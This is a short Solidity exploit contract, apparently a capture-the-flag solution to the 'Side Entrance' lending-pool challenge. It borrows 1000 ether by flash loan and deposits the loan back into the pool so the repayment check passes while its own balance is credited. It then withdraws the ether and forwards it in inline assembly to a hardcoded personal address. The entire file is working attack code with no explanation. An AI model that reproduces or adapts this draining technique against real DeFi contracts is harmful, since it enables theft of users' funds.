// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
  function flashLoan(uint256 amount) external;
  function deposit() external payable;
  function withdraw() external;
}

contract FlashLoanEtherReceiver {
  ISideEntranceLenderPool constant pool =
    ISideEntranceLenderPool(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b);

  uint256 constant ETHER_IN_POOL = 1000 ether;
  address constant IT_IS_A_ME = 0x44E97aF4418b7a17AABD8090bEA0A471a366305C;

  function init() public payable {
    pool.flashLoan(ETHER_IN_POOL);
    pool.withdraw();
  }

  function execute() external payable {
    pool.deposit{ value: ETHER_IN_POOL }();
  }

  receive() external payable {
    assembly {
      pop(call(21000, IT_IS_A_ME, ETHER_IN_POOL, 0, 0, 0, 0))
    }
  }
}
